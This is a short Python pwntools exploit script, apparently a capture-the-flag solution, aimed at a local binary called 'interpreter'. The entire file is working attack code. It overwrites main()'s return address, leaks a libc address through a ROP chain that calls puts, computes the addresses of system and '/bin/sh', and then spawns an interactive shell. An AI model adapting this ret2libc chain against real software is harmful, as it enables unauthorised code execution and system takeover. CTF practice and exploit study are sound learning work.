from pwn import *

r = process("./interpreter", env = {'LD_PRELOAD' : './libc-2.27.so'})

libc = ELF('./libc-2.27.so')
ret = 0x4005e6 
rdi = 0x400d03
memset_got = 0x602030
puts_plt = 0x400600
main = 0x400bc4

# Send the program to overwrite main()'s ret
prog = 'R '*(256 + 8*3) + 'I R '*32
r.send(prog)
# Send the ROP to leak libc
payload1 = p64(rdi) + p64(memset_got) + p64(puts_plt) + p64(main)
r.send(payload1)
libc_base = u64(r.recv(6) + '\0'*2) - 1634128
log.info('libc: ' + hex(libc_base))
system = libc_base + libc.symbols['system']
bin_sh = libc_base + next(libc.search("/bin/sh"))
# Send the program again
r.send(prog)
# Send the ROP to system()
payload2 = p64(ret) + p64(rdi) + p64(bin_sh) + p64(system)
r.send(payload2)

r.interactive()
